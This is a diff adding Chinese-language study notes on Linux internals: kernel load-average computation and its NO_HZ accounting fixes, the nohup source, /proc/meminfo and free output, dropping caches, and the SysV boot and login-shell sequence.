+#define EXP_1           1884            /* 1/exp(5sec/1min) as fixed-point */ 
+#define EXP_5           2014            /* 1/exp(5sec/5min) */ 
+#define EXP_15          2037            /* 1/exp(5sec/15min) */
+
+
+1分钟、5分钟、15分钟对应的EXP_N值如上，随着EXP_N的增大，(FIXED_1 – EXP_N)/FIXED_1值就越小， 
+这样nr_active的变化对整体load带来的影响就越小。对于一个nr_active波动较小的系统，load会 
+不断的趋近于nr_active，最开始趋近比较快，随着相差值变小，趋近慢慢变缓，越接近时越缓慢，并最 
+终达到nr_active。如下图所示： 
+文件:load 1515.jpg 
+
+
+也因此得到一个结论，load直接反应的是系统中的nr_active。 那么nr_active又包含哪些？ 如何去计算 
+当前系统中的nr_active？ 这些就涉及到了nr_active的采样。 
+
+Loadavg采样 
+
+nr_active直接反映的是为系统贡献load的进程总数，这个总数在nr_active函数中计算： 
+kernel/sched.c
+#+begin_src c
+unsigned long nr_active(void) 
+{ 
+        unsigned long i, running = 0, uninterruptible = 0; 
+
+        for_each_online_cpu(i) { 
+                running += cpu_rq(i)->nr_running; 
+                uninterruptible += cpu_rq(i)->nr_uninterruptible; 
+        } 
+
+        if (unlikely((long)uninterruptible < 0)) 
+                uninterruptible = 0; 
+
+        return running + uninterruptible; 
+}
+#+end_src
+
+ #define TASK_RUNNING            0 
+ #define TASK_INTERRUPTIBLE      1 
+ #define TASK_UNINTERRUPTIBLE    2 
+ #define TASK_STOPPED            4 
+ #define TASK_TRACED             8 
+/* in tsk->exit_state */ 
+ #define EXIT_ZOMBIE             16 
+ #define EXIT_DEAD               32 
+/* in tsk->state again */ 
+ #define TASK_NONINTERACTIVE     64
+
+
+该函数反映，为系统贡献load的进程主要包括两类，一类是TASK_RUNNING，一类是TASK_UNINTERRUPTIBLE。
+ 当5s采样周期到达时，对各个online-cpu的运行队列进行遍历，取得当前时刻该队列上running和uninterruptible的
+ 进程数作为当前cpu的load，各个cpu load的和即为本次采样得到的nr_active。 
+
+
+18内核计算loadavg存在的问题 
+
+xtime_lock解析 
+
+内核在5s周期执行一次全局load的更新，这些都是在calc_load函数中执行。追寻calc_load的调用： 
+kernel/timer.c
+#+begin_src c
+static inline void update_times(void) 
+{  
+        unsigned long ticks; 
+
+        ticks = jiffies - wall_jiffies; 
+        wall_jiffies += ticks; 
+        update_wall_time(); 
+        calc_load(ticks); 
+}
+#+end_src
+
+update_times中更新系统wall time，然后执行全局load的更新。 
+kernel/timer.c
+#+begin_src c
+void do_timer(struct pt_regs *regs) 
+{  
+        jiffies_64++; 
+        /* prevent loading jiffies before storing new jiffies_64 value. */ 
+        barrier(); 
+        update_times(); 
+}
+#+end_src
+
+do_timer中首先执行全局时钟jiffies的更新，然后是update_times。 
+#+begin_src c
+void main_timer_handler(struct pt_regs *regs) 
+{ 
+...
+        write_seqlock(&xtime_lock);
+...
+        do_timer(regs); 
+ #ifndef CONFIG_SMP 
+        update_process_times(user_mode(regs)); 
+ #endif 
+...
+        write_sequnlock(&xtime_lock); 
+}
+#+end_src
+
+对wall_time和全局jiffies的更新都是在加串行锁（sequence lock）xtime_lock之后执行的。 
+include/linux/seqlock.h
+#+begin_src c
+static inline void write_seqlock(seqlock_t *sl) 
+{ 
+        spin_lock(&sl->lock);
+        ++sl->sequence; 
+        smp_wmb(); 
+} 
+
+static inline void write_sequnlock(seqlock_t *sl) 
+{ 
+        smp_wmb(); 
+        sl->sequence++; 
+        spin_unlock(&sl->lock); 
+} 
+ 
+typedef struct { 
+        unsigned sequence; 
+        spinlock_t lock; 
+} seqlock_t;
+#+end_src
+
+sequence lock内部保护一个用于计数的sequence。Sequence lock的写锁是通过spin_lock实现的， 
+在spin_lock后对sequence计数器执行一次自增操作，然后在锁解除之前再次执行sequence的自增操作。 
+sequence初始化时为0。这样，当锁内部的sequence为奇数时，说明当前该sequence lock的写锁正被拿， 
+读和写可能不安全。如果在写的过程中，读是不安全的，那么就需要在读的时候等待写锁完成。对应读锁使用如下： 
+#+begin_src c
+ #if (BITS_PER_LONG < 64) 
+u64 get_jiffies_64(void) 
+{ 
+        unsigned long seq; 
+        u64 ret;  
+
+        do { 
+                seq = read_seqbegin(&xtime_lock); 
+                ret = jiffies_64; 
+        } while (read_seqretry(&xtime_lock, seq)); 
+        return ret; 
+} 
+
+EXPORT_SYMBOL(get_jiffies_64); 
+ #endif 
+#+end_src
+
+读锁实现如下： 
+#+begin_src c
+static __always_inline unsigned read_seqbegin(const seqlock_t *sl) 
+{ 
+        unsigned ret = sl->sequence; 
+        smp_rmb(); 
+        return ret; 
+} 
+
+static __always_inline int read_seqretry(const seqlock_t *sl, unsigned iv) 
+{ 
+        smp_rmb(); 
+      	/*iv为读之前的锁计数器
+        * 当iv为基数时，说明读的过程中写锁被拿，可能读到错误值
+        * 当iv为偶数，但是读完之后锁的计数值和读之前不一致，则说明读的过程中写锁被拿，
+        * 也可能读到错误值。
+        */
+        return (iv & 1) | (sl->sequence ^ iv);  
+}
+#+end_src
+
+至此xtime_lock的实现解析完毕，由于对应写锁基于spin_lock实现，多个程序竞争写锁时等待者会一直循环等待， 
+当锁里面处理时间过长，会导致整个系统的延时增长。另外，如果系统存在很多xtime_lock的读锁，在某个程 
+序获取该写锁后，读锁就会进入类似spin_lock的循环查询状态，直到保证可以读取到正确值。因此需要尽可能 
+短的减少在xtime_lock写锁之间执行的处理流程。 
+
+ 全局load读写分离解xtime_lock问题 
+
+在计算全局load函数calc_load中，每5s需要遍历一次所有cpu的运行队列，获取对应cpu上的load。1）由于cpu个数是不固 
+定的，造成calc_load的执行时间不固定，在核数特别多的情况下会造成xtime_lock获取的时间过长。2）calc_load是 
+每5s一次的采样程序，本身并不能够精度特别高，对全局avenrun的读和写之间也不需要专门的锁保护，可以将全局load的 
+更新和读进行分离。 
+Dimitri Sivanich提出在他们的large SMP系统上，由于calc_load需要遍历所有online CPU，造成系统延迟较大。 
+基于上述原因Thomas Gleixnert提交了下述patch对该bug进行修复： 
+[Patch 1/2] sched, timers: move calc_load() to scheduler
+[Patch 2/2] sched, timers: cleanup avenrun users
+
+
+文件:rw isolate.jpg 
+
+Thomas的两个patch，主要思想如上图所示。首先将全局load的计算分离到per-cpu上，各个cpu上计算load时不加xtime_lock 
+的锁，计算的load更新到全局calc_load_tasks中，所有cpu上load计算完后calc_load_tasks即为整体的load。在5s定 
+时器到达时执行calc_global_load，读取全局cacl_load_tasks，更新avenrun。由于只是简单的读取calc_load_tasks， 
+执行时间和cpu个数没有关系。 
+
+ 几个关键点： 
+
+ 不加xtime_lock的per cpu load计算 
+
+在不加xtime_lock的情况下，如何保证每次更新avenrun时候读取的calc_load_tasks为所有cpu已经更新之后的load？ 
+
+Thomas的解决方案 
+
+Thomas的做法是将定时器放到sched_tick中，每个cpu都设置一个LOAD_FREQ定时器。 
+定时周期到达时执行当前处理器上load的计算。sched_tick在每个tick到达时执行 
+一次，tick到达是由硬件进行控制的，客观上不受系统运行状况的影响。 
+
+sched_tick的时机 
+
+将per-cpu load的计算放至sched_tick中执行，第一反应这不是又回到了时间处理中断之间，是否依旧 
+存在xtime_lock问题？ 下面对sched_tick进行分析（以下分析基于linux-2.6.32-220.17.1.el5源码） 
+#+begin_src c
+static void update_cpu_load_active(struct rq *this_rq) 
+{ 
+        update_cpu_load(this_rq); 
+
+        calc_load_account_active(this_rq); 
+}
+ 
+void scheduler_tick(void) 
+{ 
+        int cpu = smp_processor_id(); 
+        struct rq *rq = cpu_rq(cpu); 
+...
+        spin_lock(&rq->lock); 
+...
+        update_cpu_load_active(rq); 
+...
+        spin_unlock(&rq->lock); 
+
+...
+} 
+ 
+void update_process_times(int user_tick) 
+{ 
+...
+        scheduler_tick(); 
+...
+}
+ 
+static void tick_periodic(int cpu) 
+{ 
+        if (tick_do_timer_cpu == cpu) { 
+                write_seqlock(&xtime_lock); 
+
+                /* Keep track of the next tick event */ 
+                tick_next_period = ktime_add(tick_next_period, tick_period); 
+           
+                do_timer(1);  // calc_global_load在do_timer中被调用
+                write_sequnlock(&xtime_lock); 
+        } 
+ 
+        update_process_times(user_mode(get_irq_regs())); 
+...
+}
+ 
+void tick_handle_periodic(struct clock_event_device *dev) 
+{ 
+        int cpu = smp_processor_id(); 
+...
+        tick_periodic(cpu); 
+...
+}
+#+end_src
+
+交错的时间差 
+
+将per-cpu load的计算放到sched_tick中后，还存在一个问题就是何时执行per-cpu上的load计算，如何保证更新全 
+局avenrun时读取的全局load为所有cpu都计算之后的？ 当前的方法是给所有cpu设定同样的步进时间LOAD_FREQ， 
+过了这个周期点当有tick到达则执行该cpu上load的计算，更新至全局的calc_load_tasks。calc_global_load 
+的执行点为LOAD_FREQ+10，即在所有cpu load计算执行完10 ticks之后，读取全局的calc_load_tasks更新avenrun。 
+
+
+
+通过将calc_global_load和per-cpu load计算的时间进行交错，可以避免calc_global_load在各个cpu load计算之间执行， 
+导致load采样不准确问题。 
+
+32内核Load计数nohz问题 
+
+一个问题的解决，往往伴随着无数其他问题的诞生！Per-cpu load的计算能够很好的分离全局load的更新和读取，避免大型系统中cpu 
+核数过多导致的xtime_lock问题。但是也同时带来了很多其他需要解决的问题。这其中最主要的问题就是nohz问题。 
+
+为避免cpu空闲状态时大量无意义的时钟中断，引入了nohz技术。在这种技术下，cpu进入空闲状态之后会关闭该cpu对应的时钟中断，等 
+到下一个定时器到达，或者该cpu需要执行重新调度时再重新开启时钟中断。 
+
+cpu进入nohz状态后该cpu上的时钟tick停止，导致sched_tick并非每个tick都会执行一次。这使得将per-cpu的load计算放在 
+sched_tick中并不能保证每个LOAD_FREQ都执行一次。如果在执行per-cpu load计算时，当前cpu处于nohz状态，那么当 
+前cpu上的sched_tick就会错过，进而错过这次load的更新，最终全局的load计算不准确。 
+基于Thomas第一个patch的思想，可以在cpu调度idle时对nohz情况进行处理。采用的方式是在当前cpu进入idle前进行一次该cpu 
+上load的更新，这样即便进入了nohz状态，该cpu上的load也已经更新至最新状态，不会出现不更新的情况。如下图所示： 
+
+
+
+理论上，该方案很好的解决了nohz状态导致全局load计数可能不准确的问题，事实上这却是一个苦果的开始。大量线上应用反馈 
+最新内核的load计数存在问题，在16核机器cpu利用率平均为20%~30%的情况下，整体load却始终低于1。 
+
+ 解决方案 
+
+接到我们线上报告load计数偏低的问题之后，进行了研究。最初怀疑对全局load计数更新存在竞争。对16核的系统，如果都没有进入 
+nohz状态，那么这16个核都将在LOAD_FREQ周期到达的那个tick内执行per-cpu load的计算，并更新到全局的load中，这 
+之间如果存在竞争，整体计算的load就会出错。当前每个cpu对应rq都维护着该cpu上一次计算的load值，如果发现本次计算load 
+和上一次维护的load值之间差值为0，则不用更新全局load，否则将差值更新到全局load中。正是由于这个机制，全局load如果被 
+篡改，那么在各个cpu维护着自己load的情况下，全局load最终将可能出现负值。而负值通过各种观察，并没有在线上出现，最终竞 
+争条件被排除。 
+
+通过/proc/sched_debug对线上调度信息进行分析，发现每个时刻在cpu上运行的进程基本维持在2~3个，每个时刻运行有进程的cpu都 
+不一样。进一步分析，每个cpu上平均每秒出现sched_goidle的情况大概为1000次左右。因此得到线上每次进入idle的间隔为1ms/次。 
+结合1HZ=1s=1000ticks，可以得到1tick =1ms。所以可以得到线上应用基本每一个tick就会进入一次idle！！！ 这个发现就好比 
+原来一直用肉眼看一滴水，看着那么完美那么纯净，突然间给你眼前架了一个放大镜，一下出现各种凌乱的杂碎物。 在原有的世界里， 
+10ticks是那么的短暂，一个进程都可能没有运行完成，如今发现10ticks内调度idle的次数就会有近10次。接着用例子对应用场景进行分析： 
+
+
+
+
+
+(说明：可能你注意到了在5HZ+5到5HZ+11过程中也有CPU从非idle进入了idle，但是为什么没有-1，这里是由于每个cpu都保留 
+了一份该CPU上一次计算时的load，如果load没有变化则不进行计算，这几个cpu上一次计算load为0，并没有变化) 
+
+Orz！load为3的情况直接算成了0，难怪系统整体load会偏低。这里面的一个关键点是：对已经计算过load的cpu，我们对idle进 
+行了计算，却从未考虑过这给从idle进入非idle的情况带来的不公平性。这个是当前线上2.6.32系统存在的问题。在定位到问题 
+之后，跟进到upstream中发现Peter Z针对该load计数问题先后提交了三个patch，最新的一个patch是在4月份提交。这三个 
+patch如下： 
+[Patch] sched: Cure load average vs NO_HZ woes
+[Patch] sched: Cure more NO_HZ load average woes
+[Patch] sched: Fix nohz load accounting – again!
+
+
+这是目前我们backport的patch，基本思想是将进入idle造成的load变化暂时记录起来，不是每次进入idle都导致全局load的更新。 
+这里面的难点是什么时候将idle更新至全局的load中？在最开始计算per-cpu load的时候需要将之前所有的idle都计算进来， 
+由于目前各个CPU执行load计算的先后顺序暂时没有定，所以将这个计算放在每个cpu里面都计算一遍是一种方法。接着用示例进行说明： 
+
+
+至此这三个patch能够很好的处理我们的之前碰到的进入idle的问题。 
+将上述三个patch整理完后，在淘客前端线上机器中进行测试，测试结果表明load得到了明显改善。 
+
+ 更细粒度的时间问题 
+
+* man proc
+  我一直想找的/proc的详细描述
+  man proc
+* nohup 代码
+nohup 实现原来如此简单
+#+begin_src c
+int
+fd_reopen (int desired_fd, char const *file, int flags, mode_t mode)
+{
+  int fd = open (file, flags, mode);
+
+  if (fd == desired_fd || fd < 0)
+    return fd;
+  else
+    {
+      int fd2 = dup2 (fd, desired_fd);
+      int saved_errno = errno;
+      close (fd);
+      errno = saved_errno;
+      return fd2;
+    }
+}
+#+end_src
+
+#+begin_src c
+  ignoring_input = isatty (STDIN_FILENO);
+  redirecting_stdout = isatty (STDOUT_FILENO);
+  stdout_is_closed = (!redirecting_stdout && errno == EBADF);
+  redirecting_stderr = isatty (STDERR_FILENO);
+
+  /* If standard input is a tty, replace it with /dev/null if possible.
+     Note that it is deliberately opened for *writing*,
+     to ensure any read evokes an error.  */
+  /* 忽略输入时，将标准输入的fd设置为/dev/null */
+  if (ignoring_input)
+    {
+      if (fd_reopen (STDIN_FILENO, "/dev/null", O_WRONLY, 0) < 0)
+        {
+          error (0, errno, _("failed to render standard input unusable"));
+          exit (exit_internal_failure);
+        }
+      if (!redirecting_stdout && !redirecting_stderr)
+        error (0, 0, _("ignoring input"));
+    }
+
+  /* If standard output is a tty, redirect it (appending) to a file.
+     First try nohup.out, then $HOME/nohup.out.  If standard error is
+     a tty and standard output is closed, open nohup.out or
+     $HOME/nohup.out without redirecting anything.  */
+ /* 输出是tty时，将STDOUT的fd设置为nohup.out文件的fd 
+    如果当前目录下nohup.out打开失败，那么尝试打开$HOME/nohup.out
+ */
+  if (redirecting_stdout || (redirecting_stderr && stdout_is_closed))
+    {
+      char *in_home = NULL;
+      char const *file = "nohup.out";
+      int flags = O_CREAT | O_WRONLY | O_APPEND;
+      mode_t mode = S_IRUSR | S_IWUSR;
+      mode_t umask_value = umask (~mode);
+      out_fd = (redirecting_stdout
+                ? fd_reopen (STDOUT_FILENO, file, flags, mode)
+                : open (file, flags, mode));
+
+      if (out_fd < 0)
+        {
+          int saved_errno = errno;
+          char const *home = getenv ("HOME");
+          if (home)
+            {
+              in_home = file_name_concat (home, file, NULL);
+              out_fd = (redirecting_stdout
+                        ? fd_reopen (STDOUT_FILENO, in_home, flags, mode)
+                        : open (in_home, flags, mode));
+            }
+          if (out_fd < 0)
+            {
+              int saved_errno2 = errno;
+              error (0, saved_errno, _("failed to open %s"), quote (file));
+              if (in_home)
+                error (0, saved_errno2, _("failed to open %s"),
+                       quote (in_home));
+              exit (exit_internal_failure);
+            }
+          file = in_home;
+        }
+
+      umask (umask_value);
+      error (0, 0,
+             _(ignoring_input
+               ? N_("ignoring input and appending output to %s")
+               : N_("appending output to %s")),
+             quote (file));
+      free (in_home);
+    }
+
+  /* If standard error is a tty, redirect it.  */
+  if (redirecting_stderr)
+    {
+      /* Save a copy of stderr before redirecting, so we can use the original
+         if execve fails.  It's no big deal if this dup fails.  It might
+         not change anything, and at worst, it'll lead to suppression of
+         the post-failed-execve diagnostic.  */
+      saved_stderr_fd = dup (STDERR_FILENO);
+
+      if (0 <= saved_stderr_fd
+          && set_cloexec_flag (saved_stderr_fd, true) != 0)
+        error (exit_internal_failure, errno,
+               _("failed to set the copy of stderr to close on exec"));
+
+      if (!redirecting_stdout)
+        error (0, 0,
+               _(ignoring_input
+                 ? N_("ignoring input and redirecting stderr to stdout")
+                 : N_("redirecting stderr to stdout")));
+
+      if (dup2 (out_fd, STDERR_FILENO) < 0)
+        error (exit_internal_failure, errno,
+               _("failed to redirect standard error"));
+
+      if (stdout_is_closed)
+        close (out_fd);
+    }
+
+  /* error() flushes stderr, but does not check for write failure.
+     Normally, we would catch this via our atexit() hook of
+     close_stdout, but execvp() gets in the way.  If stderr
+     encountered a write failure, there is no need to try calling
+     error() again, particularly since we may have just changed the
+     underlying fd out from under stderr.  */
+  if (ferror (stderr))
+    exit (exit_internal_failure);
+
+  signal (SIGHUP, SIG_IGN);
+
+  {
+    int exit_status;
+    int saved_errno;
+    char **cmd = argv + optind;
+
+    execvp (*cmd, cmd);
+    exit_status = (errno == ENOENT ? EXIT_ENOENT : EXIT_CANNOT_INVOKE);
+    saved_errno = errno;
+
+    /* The execve failed.  Output a diagnostic to stderr only if:
+       - stderr was initially redirected to a non-tty, or
+       - stderr was initially directed to a tty, and we
+         can dup2 it to point back to that same tty.
+       In other words, output the diagnostic if possible, but only if
+       it will go to the original stderr.  */
+    if (dup2 (saved_stderr_fd, STDERR_FILENO) == STDERR_FILENO)
+      error (0, saved_errno, _("failed to run command %s"), quote (*cmd));
+
+    exit (exit_status);
+  }
+}
+
+#+end_src
+* /proc/meminfo
+
+kernel 2.6.18中
+#+begin_src c
+static int meminfo_read_proc(char *page, char **start, off_t off,
+				 int count, int *eof, void *data)
+{
+	struct sysinfo i;
+        ....
+	get_zone_counts(&active, &inactive, &free);
+
+/*
+ * display in kilobytes.
+ */
+ #define K(x) ((x) << (PAGE_SHIFT - 10))
+	si_meminfo(&i);
+	si_swapinfo(&i);
+	committed = atomic_read(&vm_committed_space);
+	allowed = ((totalram_pages - hugetlb_total_pages())
+		* sysctl_overcommit_ratio / 100) + total_swap_pages;
+
+	cached = global_page_state(NR_FILE_PAGES) -
+			total_swapcache_pages - i.bufferram;
+	if (cached < 0)
+		cached = 0;
+
+	get_vmalloc_info(&vmi);
+
+	/*
+	 * Tagged format, for easy grepping and expansion.
+	 */
+	len = sprintf(page,
+		"MemTotal:     %8lu kB\n"
+		"MemFree:      %8lu kB\n"
+		"Buffers:      %8lu kB\n"
+		"Cached:       %8lu kB\n"
+		"SwapCached:   %8lu kB\n"
+		"Active:       %8lu kB\n"
+		"Inactive:     %8lu kB\n"
+		"HighTotal:    %8lu kB\n"
+		"HighFree:     %8lu kB\n"
+		"LowTotal:     %8lu kB\n"
+		"LowFree:      %8lu kB\n"
+		"SwapTotal:    %8lu kB\n"
+		"SwapFree:     %8lu kB\n"
+		"Dirty:        %8lu kB\n"
+		"Writeback:    %8lu kB\n"
+		"AnonPages:    %8lu kB\n"
+		"Mapped:       %8lu kB\n"
+		"Slab:         %8lu kB\n"
+		"PageTables:   %8lu kB\n"
+		"NFS_Unstable: %8lu kB\n"
+		"Bounce:       %8lu kB\n"
+		"CommitLimit:  %8lu kB\n"
+		"Committed_AS: %8lu kB\n"
+		"VmallocTotal: %8lu kB\n"
+		"VmallocUsed:  %8lu kB\n"
+		"VmallocChunk: %8lu kB\n",
+		K(i.totalram),
+		K(i.freeram),
+		K(i.bufferram),
+		K(cached),
+		K(total_swapcache_pages),
+		K(active),
+		K(inactive),
+		K(i.totalhigh),
+		K(i.freehigh),
+		K(i.totalram-i.totalhigh),
+		K(i.freeram-i.freehigh),
+		K(i.totalswap),
+		K(i.freeswap),
+		K(global_page_state(NR_FILE_DIRTY)),
+		K(global_page_state(NR_WRITEBACK)),
+		K(global_page_state(NR_ANON_PAGES)),
+		K(global_page_state(NR_FILE_MAPPED)),
+		K(global_page_state(NR_SLAB)),
+		K(global_page_state(NR_PAGETABLE)),
+		K(global_page_state(NR_UNSTABLE_NFS)),
+		K(global_page_state(NR_BOUNCE)),
+		K(allowed),
+		K(committed),
+		(unsigned long)VMALLOC_TOTAL >> 10,
+		vmi.used >> 10,
+		vmi.largest_chunk >> 10
+		);
+
+		len += hugetlb_report_meminfo(page + len);
+
+	return proc_calc_metrics(page, start, off, count, eof, len);
+ #undef K
+}
+#+end_src
+page_alloc.c:
+#+begin_src c
+void si_meminfo(struct sysinfo *val)
+{
+	val->totalram = totalram_pages;
+	val->sharedram = 0;
+	val->freeram = nr_free_pages();
+	val->bufferram = nr_blockdev_pages();
+ #ifdef CONFIG_HIGHMEM
+	val->totalhigh = totalhigh_pages;
+	val->freehigh = nr_free_highpages();
+ #else
+	val->totalhigh = 0;
+	val->freehigh = 0;
+#endif
+	val->mem_unit = PAGE_SIZE;
+}
+#+end_src
+
+block_dev.c:
+nr_blockdev_pages计算块设备使用的页框数，遍历所有块设备，将使用的页框数相加。而不包含普通文件使用的页框数
+#+begin_src c
+long nr_blockdev_pages(void)
+{
+	struct list_head *p;
+	long ret = 0;
+	spin_lock(&bdev_lock);
+	list_for_each(p, &all_bdevs) {
+		struct block_device *bdev;
+		bdev = list_entry(p, struct block_device, bd_list);
+		ret += bdev->bd_inode->i_mapping->nrpages;
+	}
+	spin_unlock(&bdev_lock);
+	return ret;
+}
+#+end_src
+
+** 释放cache
+Free命令输出的第一行是对应的实实在在的内存，不管是buffer，还是cache。Swap对应磁盘上的交换分区。Kernel会尽量使用RAM做cache，所以一般cache都比较大：
+             total       used       free     shared    buffers     cached
+Mem:       8164308    8111364     52944          0     310644     3502208
+-/+ buffers/cache:     4298512    3865796
+Swap:      2104504     440        2104064
+8G的内存，而空闲(free)的内存只有约50M，比较惊人。其实，cached占了3G+。另外，我们看到第三行used列约为4G，是比较大的，确实，该机器上跑了好几个接入服务。
+ 
+ 
+
+Kernel2.6.16之后的版本提供了一种释放cache的机制，通过修改内核参数/proc/sys/vm/drop_caches让内核释放干净的cache。
+To free pagecache:
+         echo 1 > /proc/sys/vm/drop_caches
+To free dentries and inodes:
+         echo 2 > /proc/sys/vm/drop_caches
+To free pagecache, dentries and inodes:
+         echo 3 > /proc/sys/vm/drop_caches
+ 
+ # free
+             total       used       free     shared    buffers     cached
+Mem:       1966220    1676428     289792          0     418900     705216
+-/+ buffers/cache:     552312    1413908
+Swap:      2104504     131084    1973420
+ # echo 1 > /proc/sys/vm/drop_caches
+ # free
+             total       used       free     shared    buffers     cached
+Mem:       1966220     597840    1368380          0        324      65852
+-/+ buffers/cache:     531664    1434556
+Swap:      2104504     131084    1973420
+设置内核参数drop_caches后，cached的值迅速下降。通常来说，Linux会尽量使用可用的RAM，cache过高，是正常的。而手动释放cache会增加I/O开销，导致系统性能下降。
+
+* free
+free 输出字段的意义
+
+             total       used       free     shared    buffers     cached
+Mem:       1028444     991676      36768          0      18080     632156
+-/+ buffers/cache:     341440     687004
+Swap:            0          0          0
+
+man free 知道利用/proc/meminfo，kernel会向/proc/meminfo写数据，然后free程序从中读取。
+
+Mem: 
+total = used + free  这个used包含当前正被使用的 + 现在还没使用的buffers/cached
+
+-/+ buffers/cache: 
+这行把buffers/cache视为一个整体，是kernel不采用page cache策略时将得出的数字:
+341440表示系统当前正在使用的物理内存 = 991676 - (buffers+cached)
+687004表示系统当前真正free的物理内存 = 36768  + (buffers+cached)
+
+buffers+cached = 18080 + 632156 = 650236  一共1GB内存，有650多MB做了page cache。
+buffers/cached来源于kernel中的page cache，不管内存多大，kernel经过一段时间都会逐渐用光所有内存，
+此时第一行的used接近内存条容量，就是把从没用过的内存都转化成page cache以便随时使用。
+
+page cache 包括普通的page，buffer page，swap cache。
+buffers就对应buffer page，有个额外的buffer_head struct来管理，swap cache用来减少I/O。
+
+普通文件要经过filesystem处理，对应cached
+不经过filesystem处理的metadata(比如superblock)，对应buffers。
+kernel把这两种情况统一处理，都是封装成bio，然后提交给device driver处理。
+* linux启动缓慢
+
+  linux 磁盘自检
+  mount 
+  tune2fs -l /dev/sda2
+* linux启动过程
+
+** 加载内核
+操作系统接管硬件以后，首先读入 /boot 目录下的内核文件
+** 启动初始化进程
+内核文件加载以后，就开始运行第一个程序 /sbin/init，它的作用是初始化系统环境。
+由于init是第一个运行的程序，它的进程编号（pid）就是1。其他所有进程都从它衍生，都是它的子进程。
+** 确定运行级别
+init进程首先读取文件 /etc/inittab，它是运行级别的设置文件。如果你打开它，可以看到第一行是这样的：
+　id:2:initdefault:
+
+initdefault的值是2，表明系统启动时的运行级别为2。如果需要指定其他级别，可以手动修改这个值。
+那么，运行级别2有些什么程序呢，系统怎么知道每个级别应该加载哪些程序呢？......回答是每个运行级别在/etc目录下面，都有一个对应的子目录，指定要加载的程序。
+
+　　/etc/rc0.d
+　　/etc/rc1.d
+　　/etc/rc2.d
+　　/etc/rc3.d
+　　/etc/rc4.d
+　　/etc/rc5.d
+　　/etc/rc6.d
+　　
+上面目录名中的"rc"，表示run command（运行程序），最后的d表示directory（目录）。下面让我们看看 /etc/rc2.d 目录中到底指定了哪些程序。
+
+　　$ ls  /etc/rc2.d
+　　
+　　README
+　　S01motd
+　　S13rpcbind
+　　S14nfs-common
+　　S16binfmt-support
+　　S16rsyslog
+　　S16sudo
+　　S17apache2
+　　S18acpid
+　　...
+　　
+可以看到，除了第一个文件README以外，其他文件名都是"字母S+两位数字+程序名"的形式。
+字母S表示Start，也就是启动的意思（启动脚本的运行参数为start），如果这个位置是字母K，就代表Kill（关闭），即如果从其他运行级别切换过来，需要关闭的程序（启动脚本的运行参数为stop）。后面的两位数字表示处理顺序，数字越小越早处理，所以第一个启动的程序是motd，然后是rpcbing、nfs......数字相同时，则按照程序名的字母顺序启动，所以rsyslog会先于sudo启动。
+这个目录里的所有文件（除了README），就是启动时要加载的程序。如果想增加或删除某些程序，不建议手动修改 /etc/rcN.d 目录，最好是用一些专门命令进行管理
+
+
+** 加载开机启动程序
+   守护进程
+
+前面提到，七种预设的"运行级别"各自有一个目录，存放需要开机启动的程序。
+不难想到，如果多个"运行级别"需要启动同一个程序，那么这个程序的启动脚本，就会在每一个目录里都有一个拷贝。
+这样会造成管理上的困扰：如果要修改启动脚本，岂不是每个目录都要改一遍？
+Linux的解决办法，就是七个 /etc/rcN.d 目录里列出的程序，都设为链接文件，指向另外一个目录 /etc/init.d ，真正的启动脚本都统一放在这个目录中。
+init进程逐一加载开机启动程序，其实就是运行这个目录里的启动脚本。
+
+下面就是链接文件真正的指向。
+
+　　$ ls -l /etc/rc2.d
+　　
+　　README
+　　S01motd -> ../init.d/motd
+　　S13rpcbind -> ../init.d/rpcbind
+　　S14nfs-common -> ../init.d/nfs-common
+　　S16binfmt-support -> ../init.d/binfmt-support
+　　S16rsyslog -> ../init.d/rsyslog
+　　S16sudo -> ../init.d/sudo
+　　S17apache2 -> ../init.d/apache2
+　　S18acpid -> ../init.d/acpid
+　　...
+　　
+这样做的另一个好处，就是如果你要手动关闭或重启某个进程，直接到目录 /etc/init.d 中寻找启动脚本即可。比如，我要重启Apache服务器，就运行下面的命令：
+
+　　$ sudo /etc/init.d/apache2 restart
+　　
+/etc/init.d 这个目录名最后一个字母d，是directory的意思，表示这是一个目录，用来与程序 /etc/init 区分。
+
+** 用户登录
+开机启动程序加载完毕以后，就要让用户登录了。
+
+一般来说，用户的登录方式有三种：
+　　（1）命令行登录
+　　（2）ssh登录
+　　（3）图形界面登录
+这三种情况，都有自己的方式对用户进行认证。
+（1）命令行登录：init进程调用getty程序（意为get teletype），让用户输入用户名和密码。输入完成后，再调用login程序，核对密码（Debian还会再多运行一个身份核对程序/etc/pam.d/login）。如果密码正确，就从文件 /etc/passwd 读取该用户指定的shell，然后启动这个shell。
+（2）ssh登录：这时系统调用sshd程序（Debian还会再运行/etc/pam.d/ssh ），取代getty和login，然后启动shell。
+（3）图形界面登录：init进程调用显示管理器，Gnome图形界面对应的显示管理器为gdm（GNOME Display Manager），然后用户输入用户名和密码。如果密码正确，就读取/etc/gdm3/Xsession，启动用户的会话。
+** 进入 login shell
+所谓shell，简单说就是命令行界面，让用户可以直接与操作系统对话。用户登录时打开的shell，就叫做login shell。
+
+Debian默认的shell是Bash，它会读入一系列的配置文件。上一步的三种情况，在这一步的处理，也存在差异。
+（1）命令行登录：首先读入 /etc/profile，这是对所有用户都有效的配置；然后依次寻找下面三个文件，这是针对当前用户的配置。
+
+　　~/.bash_profile
+　　~/.bash_login
+　　~/.profile
+　　
+需要注意的是，这三个文件只要有一个存在，就不再读入后面的文件了。比如，要是 ~/.bash_profile 存在，就不会再读入后面两个文件了。
+（2）ssh登录：与第一种情况完全相同。
+（3）图形界面登录：只加载 /etc/profile 和 ~/.profile。也就是说，~/.bash_profile 不管有没有，都不会运行。
+** 打开 non-login shell
+老实说，上一步完成以后，Linux的启动过程就算结束了，用户已经可以看到命令行提示符或者图形界面了。但是，为了内容的完整，必须再介绍一下这一步。
+用户进入操作系统以后，常常会再手动开启一个shell。这个shell就叫做 non-login shell，意思是它不同于登录时出现的那个shell，不读取/etc/profile和.profile等配置文件。
+
+non-login shell的重要性，不仅在于它是用户最常接触的那个shell，还在于它会读入用户自己的bash配置文件 ~/.bashrc。大多数时候，我们对于bash的定制，都是写在这个文件里面的。
+你也许会问，要是不进入 non-login shell，岂不是.bashrc就不会运行了，因此bash 也就不能完成定制了？事实上，Debian已经考虑到这个问题了，请打开文件 ~/.profile，可以看到下面的代码：
+
+　　if [ -n "$BASH_VERSION" ]; then
+　　　　if [ -f "$HOME/.bashrc" ]; then
+　　　　　　. "$HOME/.bashrc"
+　　　　fi
+　　fi
+　　
+上面代码先判断变量 $BASH_VERSION 是否有值，然后判断主目录下是否存在 .bashrc 文件，如果存在就运行该文件。第三行开头的那个点，是source命令的简写形式，表示运行某个文件，写成"source ~/.bashrc"也是可以的。
